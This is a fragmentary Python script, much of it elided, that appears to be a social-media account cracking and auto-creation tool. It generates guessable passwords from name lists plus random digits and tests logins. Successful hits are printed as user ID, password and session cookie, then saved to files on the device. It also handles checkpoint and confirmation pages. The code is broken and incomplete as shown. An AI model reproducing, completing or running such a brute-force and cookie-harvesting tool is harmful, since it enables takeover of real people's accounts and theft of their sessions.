...
try:
    ...
    os.system('python Algeria_28.py')
try:
...
pas=random.choice(m).replace('|','').lower()+rnd(1111,9999)
              ...
              if requests=="chk":
                ...
                pass
                 ...
                 print("\r\r\033[1;32m [kr-OK] "+uid+'|'+pas+'|'+coki)
                 
                 ok+=1
                 open("/sdcard/DODAUTO-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
        ...
        for x in range(lim):
            ...
            try:
                ...
                if 'checkpoint' in getts.url:
                    ...
                    print ('\r\033[1;32m [kr-OK] '+cok['c_user']+' | '+passw+'\033[0;97m     ')
                    open('/sdcard/kr/kr-CREATE.txt','a').write(cok['c_user']+' | '+passw+' \n')
                        ...
                        for x in BeautifulSoup(po.text, 'html.parser').find_all('form', {'method': 'post'}):
                            if 'confirmation_event_location=cliff' in str(x):
                                ...
                                if 'checkpoint' in rex.url:
                                    cok = self.ses.cookies.get_dict()
                                    cp.append(email+passw)
                                    print ('\r\033[1;32m[kr-CP] '+cok['c_user']+' | '+passw+'\033[0;97m     ')
                                else:
